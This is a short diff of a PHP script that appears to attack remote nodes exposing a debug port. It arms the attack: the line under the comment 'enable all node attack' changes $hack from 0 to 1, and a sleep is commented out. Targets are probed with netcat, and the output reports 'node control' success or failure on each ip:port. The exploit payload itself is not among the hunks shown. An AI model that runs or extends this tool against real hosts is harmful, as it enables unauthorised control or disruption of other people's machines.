@@ -1,6 +1,6 @@
 <?php
 //enable all node attack
-$hack = 0;
+$hack = 1;
 //list of debug port
 $port_list = ["42261"];
 //web <br> or console \n
@@ -19,7 +19,7 @@ function check_up($ip, $ip_port){
 	//$cmd = "nmap -Pn -p $ip_port $ip | grep $ip_port | grep open";
 	$cmd = "nc $ip $ip_port -w 2 | wc -c";
 	$result = shell_exec( $cmd );
-	if (intval($result) == "34"){
+	if (intval($result) == 34){
 		return 1;
 	}
 	return 0;
@@ -78,7 +78,7 @@ if (count($target_list)){
 		}else{
 			echo "==> node control error on : ".$target[0].":".$target[1].$br;
 		}	
-		sleep(2);
+		//sleep(2);
 		if (check_up($target[0], $target[1])){
 			echo "==> node control fail on : ".$target[0].":".$target[1].$br;
 		}else{
